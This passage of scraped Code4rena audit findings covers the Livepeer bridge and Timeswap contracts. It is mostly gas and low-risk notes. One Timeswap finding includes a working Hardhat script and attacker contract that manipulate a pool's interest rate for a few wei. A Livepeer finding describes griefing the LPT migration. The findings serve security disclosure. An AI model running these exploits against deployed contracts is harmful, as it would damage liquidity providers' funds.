https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L472-L472  ```solidity for (uint256 i = 0; i < _unbondingLockIds.length; i++) ```  Setting `uint256` variables to `0` is redundant as they default to `0`.  "}, {"title": "Custom GOVERNOR_ROLE unnecessary", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/116", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  The ControlledGateway.sol contract specifies a custom \"GOVERNOR_ROLE\" value that is assigned to the _msgsender when the contract is deployed. There is no need to create a custom role when only one role is used in the contract. This custom \"GOVERNOR_ROLE\" could be replaced with the built-in \"DEFAULT_ADMIN_ROLE\" value, which is the approach in the contract L1/escrow/L1Escrow.sol.  ## Proof of Concept  The custom role is created [on line 13 of ControlledGateway.sol](https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/ControlledGateway.sol#L13)  ## Recommended Mitigation Steps  Remove the GOVERNOR_ROLE role in ControlledGateway.sol and use the built-in DEFAULT_ADMIN_ROLE role to save gas  "}, {"title": "Revert string > 32 bytes", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/115", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  Strings are broken into 32 byte chunks for operations. Revert error strings over 32 bytes therefore consume extra gas than shorter strings, as [documented publicly](https://blog.polymath.network/solidity-tips-and-tricks-to-save-gas-and-reduce-bytecode-size-c44580b218e6#c17b).  ## Proof of Concept  There are dozens of examples of this gas optimization opportunity in the project, but some examples of this issue include: - [L2/gateway/L2Migrator.sol:184](https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L184) - [L2/gateway/L2Migrator.sol:201](https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L201) - [L2/gateway/L2Migrator.sol:221](https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L221) - [L2/gateway/L2Migrator.sol:257](https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L257) - [bonding/BondingManager.sol:553](https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/bonding/BondingManager.sol#L553) - [bonding/BondingManager.sol:463](https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/bonding/BondingManager.sol#L463) - [bonding/BondingManager.sol:651](https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/bonding/BondingManager.sol#L651) - [token/Minter.sol:78](https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/token/Minter.sol#L78) - [token/Minter.sol:80](https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/token/Minter.sol#L80) - [token/Minter.sol:93](https://github.com/livepeer/protocol/blob/20e7ebb86cdb4fe9285bf5fea02eb603e5d48805/contracts/token/Minter.sol#L93)  ## Recommended Mitigation Steps  Reducing revert error strings to under 32 bytes decreases deployment time gas and runtime gas when the revert condition is met. Alternatively, use custom errors, introduced in Solidity 0.8.4: https://blog.soliditylang.org/2021/04/21/custom-errors/  "}, {"title": "L1Migrator.migrateLPT` can be used to take away protocol's access to LPT tokens in BridgeMinter", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/97", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle\r \r Ruhum\r \r \r # Vulnerability details\r \r # Vulnerability details\r \r ## Impact\r Same thing as the ETH issue I reported earlier. I wasn't sure if those are supposed to be a single issue or not. The concept is the same. But, now you lose LPT tokens.\r \r The `L1Migrator.migrateLPT()` function can be called by **anyone**. It pulls all the LPT from the `BridgeMinter` contract and starts the process of moving the funds to L2. First of all, this function is only executable once. The RetryableTicket created with the first call is the only chance of moving the funds to L2.\r \r The attacker can call the function with [parameters](https://developer.offchainlabs.com/docs/l1_l2_messages#parameters) that make the creation of the RetryableTicket on L2 fail. Thus, the LPT sits in the L1Migrator contract with no way of moving it to L2 or anywhere else. Effectively, the funds are lost.\r \r ## Proof of Concept\r The function is only executable once because it uses the `amount` returned by `IBridgeMinter(bridgeMinterAddr).withdrawLPTToL1Migrator()` to specify the amount of LPT to be sent to L2: https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1Migrator.sol#L342\r \r After the first call to `migrateLPT()` that function will always return 0 since the `BridgeMinter` won't have any more LPT: https://github.com/livepeer/protocol/blob/streamflow/contracts/token/BridgeMinter.sol#L107\r \r So after the attacker called `migrateLPT()` with insufficient funds to create a RetryableTicket on L2 we have the following state:\r - BridgeMinter has 0 LPT\r - L1Migrator has X amount of LPT that is not accessible. There are no functions to get the LPT out of there.\r - 1 failed RetryTicket\r \r The same thing can also be triggered by a non-malicious caller by simply providing insufficient funds. The whole design of only being able to try once is the issue here.\r \r ## Tools Used\r none\r \r ## Recommended Mitigation Steps\r Instead of using the `amount` returned by `IBridgeMinter(bridgeMinterAddr).withdrawLPTToL1Migrator()` you should use the balance of the `L1Migrator` contract.\r \r It might also make sense to **not** allow anybody to call the function. I don't see the benefit of that.\r \r `EDIT` Actually, the funds aren't lost. The funds are sent to the Escrow contract which can be used to transfer the funds back to the BridgeMinter contract. Thus, you could reset the whole thing to its initial state and call `L1Migrator.migrateLPT()` again. But, a really persistent attacker has the ability to DoS the function by frontrunning any call to it which results in the RetryableTicket failing again. Thus, you'd have to transfer the funds from the Escrow contract to the BrigeMinter again and so on.\r \r So the same scenario I've outlined earlier is still viable. It's just a bit more difficult now since it has a higher cost for the attacker now. Because of that I think it's an medium issue instead of high.\r \r Also, the mitigation steps I've given aren't valid. You can't use the `L1Migrator` contract's balance since it will always be 0 (the funds are sent to the Escrow contract). Thus the best solution would be to just limit the access to the function."}, {"title": "Lack of event", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/83", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Users and dapps are not notified when someting important is changed.  ## Proof of Concept  Functions that are only executable by privileged users (e.g. onlyOwner) and have an impact (e.g. financial, trust) on other users should emit events.  - contracts\\L1\\gateway\\L1LPTGateway.sol : [setCounterpart,setMinter]. - contracts\\L2\\gateway\\L2Migrator.sol : [setL1Migrator,setDelegatorPoolImpl,setClaimStakeEnabled]. - contracts\\L2\\gateway\\L2LPTGateway.sol : [setCounterpart]. - contracts\\L2\\gateway\\L2LPTDataCache.sol : [setL1LPTDataCache,setL2LPTGateway].  ## Tools Used Manual review.  ## Recommended Mitigation Steps Emit event during important changes.  "}, {"title": "Cache array length in for loops can save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/77", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  ## Proof of Concept  1. Navigate to the following smart contract line.  ``` https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2Migrator.sol#L197  https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L1/gateway/L1Migrator.sol#L472 ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to cache array length.  "}, {"title": "Gas: Consider making some constants as non-public to save gas", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Reducing from public to private will save gas    ## Proof of Concept   ``` arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:111:    bytes32 public constant GOVERNOR_ROLE = keccak256(\"GOVERNOR_ROLE\"); arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:59:    bytes32 public constant GOVERNOR_ROLE = keccak256(\"GOVERNOR_ROLE\"); arbitrum-lpt-bridge\\contracts\\L2\\token\\LivepeerToken.sol:9:    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\"); arbitrum-lpt-bridge\\contracts\\L2\\token\\LivepeerToken.sol:10:    bytes32 public constant BURNER_ROLE = keccak256(\"BURNER_ROLE\"); arbitrum-lpt-bridge\\contracts\\ControlledGateway.sol:13:    bytes32 public constant GOVERNOR_ROLE = keccak256(\"GOVERNOR_ROLE\"); ```  ## Tools Used   VS Code      ## Recommended Mitigation Steps   Theses constants can simply be read from the verified contract, i.e., it is unnecessary to expose them with a public function.  "}, {"title": "Gas: Internal functions can be private if the contract is not herited", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   `private` functions are cheaper than `internal` functions.      ## Proof of Concept   Several `internal` functions are in contracts that are never inherited.      Their `internal` keywords are there:      ``` arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1LPTGateway.sol:170:        internal arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:505:    ) internal view { arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:518:        internal arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2LPTGateway.sol:123:        internal arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:307:    ) internal { arbitrum-lpt-bridge\\contracts\\L2\\pool\\DelegatorPool.sol:95:    function transferBond(address _delegator, uint256 _stake) internal { arbitrum-lpt-bridge\\contracts\\L2\\pool\\DelegatorPool.sol:106:    function pendingStake() internal view returns (uint256) { arbitrum-lpt-bridge\\contracts\\L2\\pool\\DelegatorPool.sol:110:    function pendingFees() internal view returns (uint256) { protocol\\contracts\\Manager.sol:48:    function _onlyController() internal view { protocol\\contracts\\Manager.sol:52:    function _onlyControllerOwner() internal view { protocol\\contracts\\Manager.sol:56:    function _whenSystemNotPaused() internal view { protocol\\contracts\\Manager.sol:60:    function _whenSystemPaused() internal view {   ```     Therefore, their visibility should be reduced to `private`.      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Define these functions as `private`.   "}, {"title": "Gas: Use `calldata` instead of `memory` for external functions where the function argument is read-only.", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/61", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   On external functions, when using the `memory` keyword with a function argument, what's happening is that a `memory` acts as an intermediate.      Reading directly from `calldata` using `calldataload` instead of going via `memory` saves the gas from the intermediate memory operations that carry the values.      As an extract from https://ethereum.stackexchange.com/questions/74442/when-should-i-use-calldata-and-when-should-i-use-memory :   > `memory` and `calldata` (as well as `storage`) are keywords that define the data area where a variable is stored. To answer your question directly, `memory` should be used when declaring variables (both function parameters as well as inside the logic of a function) that you want stored in memory (temporary), and `calldata` _must_ be used when declaring an **external** function's **dynamic** parameters. The easiest way to think about the difference is that `calldata` is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.      ## Proof of Concept   ``` arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:159:        bytes memory _sig, arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:209:        bytes memory _sig, arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:262:        bytes memory _sig, arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:130:    function finalizeMigrateDelegator(MigrateDelegatorParams memory _params) arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:195:        MigrateUnbondingLocksParams memory _params arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:215:    function finalizeMigrateSender(MigrateSenderParams memory _params) ```     ## Tools Used   VS Code      ## Recommended Mitigation Steps   Use `calldata` instead of `memory` for external functions where the function argument is read-only.   "}, {"title": "double storage call in function decreaseL2SupplyFromL1", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/51", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact save in memory can save more gas instead of double storage call  ## Proof of Concept https://github.com/livepeer/arbitrum-lpt-bridge/blob/ebf68d11879c2798c5ec0735411b08d0bea4f287/contracts/L2/gateway/L2LPTDataCache.sol#L57  ## Tools Used Remix  ## Recommended Mitigation Steps add `l2SupplyFromL1` to memory example: ```         uint256 savel2SupplyFromL1 = l2SupplyFromL1;         if (_amount > savel2SupplyFromL1) {             savel2SupplyFromL1 = 0;         } else {             savel2SupplyFromL1 -= _amount;         } ```  "}, {"title": "Protocol uses floating pragmas ", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/47", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In files like L1LPTDataCache.sol,  floating pragmas are used.  Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.  ## Proof of Concept https://swcregistry.io/docs/SWC-103  ## Tools Used Manual code review   ## Recommended Mitigation Steps Lock the pragma version:  delete pragma solidity 0.8.0 in favor of pragma solidity 0.8.0  "}, {"title": "using empty String which is already default 0x", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/30", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact expensive gas  ## Proof of Concept https://github.com/livepeer/arbitrum-lpt-bridge/blob/main/contracts/L1/gateway/L1LPTGateway.sol#L227  ## Tools Used Remix  ## Recommended Mitigation Steps change to `bytes memory emptyBytes;`  "}, {"title": "Public functions to external", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  robee   # Vulnerability details  The following functions could be set external to save gas and improve code quality.  External call cost is less expensive than of public functions.           L2LPTDataCache.sol, l1CirculatingSupply         L2LPTGateway.sol, outboundTransfer         DelegatorPool.sol, initialize         IController.sol, getContract         Manager.sol, constructor         BridgeMinter.sol, constructor         BridgeMinter.sol, getController   "}, {"title": "Upgrade pragma to at least 0.8.4", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/14", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  robee   # Vulnerability details           Using newer compiler versions and the optimizer gives gas optimizations         and additional safety checks are available for free.                  The advantages of versions 0.8.* over <0.8.0 are:                  1. Safemath by default from 0.8.0 (can be more gas efficient than library based safemath.)         2. Low level inliner : from 0.8.2, leads to cheaper runtime gas. Especially relevant when the contract has small functions. For example, OpenZeppelin libraries typically have a lot of small helper functions and if they are not inlined, they cost an additional 20 to 40 gas because of 2 extra jump instructions and additional stack operations needed for function calls.         3. Optimizer improvements in packed structs: Before 0.8.3, storing packed structs, in some cases used an additional storage read operation. After EIP-2929, if the slot was already cold, this means unnecessary stack operations and extra deploy time costs. However, if the slot was already warm, this means additional cost of 100 gas alongside the same unnecessary stack operations and extra deploy time costs.         4. Custom errors from 0.8.4, leads to cheaper deploy time cost and run time cost. Note: the run time cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.              IController.sol         IManager.sol         Manager.sol         BridgeMinter.sol   "}, {"title": "Solidity compiler versions mismatch", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/10", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  robee   # Vulnerability details  The project is compiled with different versions of solidity, which is not recommended due ti  undefined behaviors as a result of it.           "}, {"title": "Named return issue", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  robee   # Vulnerability details  Users can mistakenly think that the return value is the named return, but it is actually the actualreturn statement that comes after. To know that the user needs to read the code and is confusing. Furthermore, removing either the actual return or the named return will save gas.           L1LPTGateway.sol, getOutboundCalldata         L2LPTGateway.sol, outboundTransfer         L2LPTGateway.sol, getOutboundCalldata  "}, {"title": "Manipulation of the Y State Results in Interest Rate Manipulation", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/187", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Rhynorater   # Vulnerability details  ## Impact Due to lack of constraints on user input in the `TimeswapPair.sol#mint` function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.   Disclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I'm going to give it a go.   ## Proof of Concept The attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.   Consider the following HardHat script: ``` const hre = require(\"hardhat\");   //jtok is asset //usdc is collat  async function launchTestTokens(tokenDeployer){     //Launch a token     const TestToken = await ethers.getContractFactory(\"TestToken\", signer=tokenDeployer);     const tt = await TestToken.deploy(\"JTOK\", \"JTOK\", 1000000000000000)     const tt2 = await TestToken.deploy(\"USDC\", \"USDC\", 1000000000000000)     let res = await tt.balanceOf(tokenDeployer.address)     let res2 = await tt.balanceOf(tokenDeployer.address)     console.log(\"JTOK balance: \"+res)     console.log(\"USDC balance: \"+res2)     return [tt, tt2] }  async function deployAttackersContract(attacker, jtok, usdc){     const Att = await ethers.getContractFactory(\"Attacker\", signer=attacker)     const atakcontrak = await Att.deploy(jtok.address, usdc.address)     return atakcontrak }  async function deployLPContract(lp, jtok, usdc){     const LP = await ethers.getContractFactory(\"LP\", signer=lp)     const lpc = await LP.deploy(jtok.address, usdc.address)     return lpc }  async function main() {     const [tokenDeployer, lp, attacker] = await ethers.getSigners();     let balance = await tokenDeployer.getBalance()     let factory = await ethers.getContractAt(\"TimeswapFactory\", \"0x5FbDB2315678afecb367f032d93F642f64180aa3\", signer=tokenDeployer)     //let [jtok, usdc] = await launchTestTokens(tokenDeployer)     let jtok = await ethers.getContractAt(\"TestToken\", \"0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6\", signer=tokenDeployer)     let usdc = await ethers.getContractAt(\"TestToken\", \"0x8a791620dd6260079bf849dc5567adc3f2fdc318\", signer=tokenDeployer)     console.log(\"Jtok: \"+jtok.address)     console.log(\"USDC: \"+usdc.address)      //Create Pair     //let txn = await factory.createPair(jtok.address, usdc.address)     pairAddress = await factory.getPair(jtok.address, usdc.address)     pair = await ethers.getContractAt(\"TimeswapPair\", pairAddress, signer=tokenDeployer)     console.log(\"Pair address: \"+pairAddress);      // Deploy LP     //let lpc = await deployLPContract(lp, jtok, usdc)     let lpc = await ethers.getContractAt(\"LP\", \"0x948b3c65b89df0b4894abe91e6d02fe579834f8f\", signer=lp)       let jtokb = await jtok.balanceOf(lpc.address)     let usdcb = await usdc.balanceOf(lpc.address)     console.log(\"LP Jtok: \"+jtokb)     console.log(\"LP USDC: \"+usdcb)      //let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)     let res = await pair.constantProduct(1641859791);     console.log(\"Post LP Constants:\", res);      let atakcontrak = await deployAttackersContract(attacker, jtok, usdc)      jtokb = await jtok.balanceOf(atakcontrak.address)     usdcb = await usdc.balanceOf(atakcontrak.address)     console.log(\"Attacker Jtok: \"+jtokb)     console.log(\"Attacker USDC: \"+usdcb)      //mint some tokens     let txn2 = await atakcontrak.timeswapMint(1641859791, 15, pairAddress)      let res2 = await pair.constantProduct(1641859791);     console.log(\"Post Attack Constants:\", res2);  } main().then(()=>process.exit(0))  ```  First, the LP deploys their pool and contributes their desired amount of tokens with the below contract: ``` pragma solidity =0.8.4;  import \"hardhat/console.sol\"; import {ITimeswapMintCallback} from \"./interfaces/callback/ITimeswapMintCallback.sol\"; import {IPair} from \"./interfaces/IPair.sol\"; import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; interface TestTokenLP is IERC20{     function mmint(uint256 amount) external; }  contract LP is ITimeswapMintCallback {      uint112 constant SEC_PER_YEAR = 31556926;     TestTokenLP internal jtok;     TestTokenLP internal usdc;  constructor(address _jtok, address _usdc){     jtok = TestTokenLP(_jtok);     jtok.mmint(10_000 ether);     usdc = TestTokenLP(_usdc);     usdc.mmint(10_000 ether); }  function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{     uint256 maturity = maturity;     console.log(\"Maturity: \", maturity);     address liquidityTo = address(this);     address dueTo = address(this);     uint112 xIncrease = 5_000 ether;     uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);     uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP     IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, \"\"); }   function timeswapMintCallback(         uint112 assetIn,         uint112 collateralIn,         bytes calldata data     ) override external{         jtok.mmint(100_000 ether);         usdc.mmint(100_000 ether);         console.log(\"Asset requested:\", assetIn);         console.log(\"Collateral requested:\", collateralIn);         //check before         uint256 beforeJtok = jtok.balanceOf(msg.sender);         console.log(\"LP jtok before\", beforeJtok);         //transfer         jtok.transfer(msg.sender, assetIn);         //check after         uint256 afterJtok = jtok.balanceOf(msg.sender);         console.log(\"LP jtok after\", afterJtok);         //check before         uint256 beforeUsdc = usdc.balanceOf(msg.sender);         console.log(\"LP USDC  before\", beforeUsdc);         //transfer         usdc.transfer(msg.sender, collateralIn);         //check after         uint256 afterUsdc = usdc.balanceOf(msg.sender);         console.log(\"LP USDC After\", afterUsdc);              } }  ``` Here are the initialization values: ```     uint112 xIncrease = 5_000 ether;     uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);     uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP ``` With this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: https://timeswap.gitbook.io/timeswap/deep-dive/borrowing to  be: ``` yMax: 4.7533146923118e-06 Min Interest Rate: 0.009374999999999765 Max Interest Rate: 0.14999999999999625 zMax: 1666.6666666666667  ``` Around 1% to 15%.   Then, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract: ``` pragma solidity =0.8.4;  import \"hardhat/console.sol\"; import {ITimeswapMintCallback} from \"./interfaces/callback/ITimeswapMintCallback.sol\"; import {IPair} from \"./interfaces/IPair.sol\"; import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol'; interface TestTokenAtt is IERC20{     function mmint(uint256 amount) external; }  contract Attacker is ITimeswapMintCallback {      uint112 constant SEC_PER_YEAR = 31556926;     TestTokenAtt internal jtok;     TestTokenAtt internal usdc;  constructor(address _jtok, address _usdc){     jtok = TestTokenAtt(_jtok);     jtok.mmint(10_000 ether);     usdc = TestTokenAtt(_usdc);     usdc.mmint(10_000 ether); }  function timeswapMint(uint maturity, uint112 APR, address pairAddress) public{     uint256 maturity = maturity;     console.log(\"Maturity: \", maturity);     address liquidityTo = address(this);     address dueTo = address(this);     uint112 xIncrease = 3;     uint112 yIncrease = 1000000000000000;     uint112 zIncrease = 5; //Static 167% CDP     IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, \"\"); }   function timeswapMintCallback(         uint112 assetIn,         uint112 collateralIn,         bytes calldata data     ) override external{         jtok.mmint(100_000 ether);         usdc.mmint(100_000 ether);         console.log(\"Asset requested:\", assetIn);         console.log(\"Collateral requested:\", collateralIn);         //check before         uint256 beforeJtok = jtok.balanceOf(msg.sender);         console.log(\"Attacker jtok before\", beforeJtok);         //transfer         jtok.transfer(msg.sender, assetIn);         //check after         uint256 afterJtok = jtok.balanceOf(msg.sender);         console.log(\"Attacker jtok after\", afterJtok);         //check before         uint256 beforeUsdc = usdc.balanceOf(msg.sender);         console.log(\"Attacker USDC  before\", beforeUsdc);         //transfer         usdc.transfer(msg.sender, collateralIn);         //check after         uint256 afterUsdc = usdc.balanceOf(msg.sender);         console.log(\"Attacker USDC After\", afterUsdc);              } } ```  Which contains the following settings for a mint: ```     uint112 xIncrease = 3;     uint112 yIncrease = 1000000000000000;     uint112 zIncrease = 5; //Static 167% CDP ```  According to my logs in hardhat: ```     Maturity:  1641859791     Callback before: 8333825816710789998373     Asset requested: 3     Collateral requested: 6     Attacker jtok before 5000000000000000000000     Attacker jtok after 5000000000000000000003     Attacker USDC  before 8333825816710789998373     Attacker USDC After 8333825816710789998379     Callback after: 8333825816710789998379     Callback expected after: 8333825816710789998379  ``` The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes: ``` yMax: 0.0002047533146923118 Min Interest Rate: 0.40383657499999975 Max Interest Rate: 6.461385199999996 zMax: 1666.6666666666667 ``` Between 40 and 646 percent.   xyz values before and after: ``` Post LP Constants: [ BigNumber { value: \"5000000000000000000000\" },   BigNumber { value: \"23766573461559\" },   BigNumber { value: \"8333333333333333333333\" },   x: BigNumber { value: \"5000000000000000000000\" },   y: BigNumber { value: \"23766573461559\" },   z: BigNumber { value: \"8333333333333333333333\" } ] Attacker Jtok: 10000000000000000000000 Attacker USDC: 10000000000000000000000 Post Attack Constants: [ BigNumber { value: \"5000000000000000000003\" },   BigNumber { value: \"1023766573461559\" },   BigNumber { value: \"8333333333333333333338\" },   x: BigNumber { value: \"5000000000000000000003\" },   y: BigNumber { value: \"1023766573461559\" },   z: BigNumber { value: \"8333333333333333333338\" } ]  ```  This result in destruction of the pool.   "}, {"title": "Adding Unchecked Directive will Save Gas for BurnMath.sol#getAsset and BurnMath.sol#getCollateral functions", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/183", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  Rhynorater   # Vulnerability details  In `BurnMath.sol` we have the following function defined; ```     function getAsset(IPair.State memory state, uint256 liquidityIn) internal pure returns (uint128 assetOut) {         if (state.reserves.asset <= state.totalClaims.bond) return assetOut;          uint256 _assetOut = state.reserves.asset;         _assetOut -= state.totalClaims.bond;         _assetOut = _assetOut.mulDiv(liquidityIn, state.totalLiquidity);         assetOut = _assetOut.toUint128(); } ``` Since the above `if` statement ensures that `state.reserves.asset` is  not less than or equal to `state.totalClaims.bond`, it is impossible for the `_assetOut -= state.totalClaims.bond; ` line to underflow. As a result, adding the `unchecked` directive around this will save on gas.  By the same reasoning, in the `getCollateral` function: ``` deficit -= state.reserves.asset; ``` is already checked by the  ``` if (state.reserves.asset >= state.totalClaims.bond) { ``` `if` statement. Surrounding this with `unchecked` will also save on gas.  Lastly, this also applies in `WithdrawMath.sol#getCollateral`: ```         if (state.reserves.asset >= state.totalClaims.bond) return collateralOut;         uint256 deficit = state.totalClaims.bond;         deficit -= state.reserves.asset; ``` The deficit will never underflow here, so adding `unchecked` will save on gas.   ##References https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/BurnMath.sol#L22 https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/BurnMath.sol#L41 https://github.com/code-423n4/2022-01-timeswap/blob/5960e07d39f2b4a60cfabde1bd51f4b1e62e7e85/Timeswap/Timeswap-V1-Core/contracts/libraries/WithdrawMath.sol#L33   "}, {"title": "`10 ** 9` can be changed to `1e9` and save some gas", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/177", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/NFTTokenURIScaffold.sol#L132-L132  ```solidity if (significantDigits > 10 ** 9) { ```  Can be changed to:  ```solidity if (significantDigits > 1e9) { ```  "}, {"title": "`SquareRoot#sqrtUp()` Wrong implementation", "html_url": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/176", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-timeswap-findings", "body": "# Handle  WatchPug   # Vulnerability details  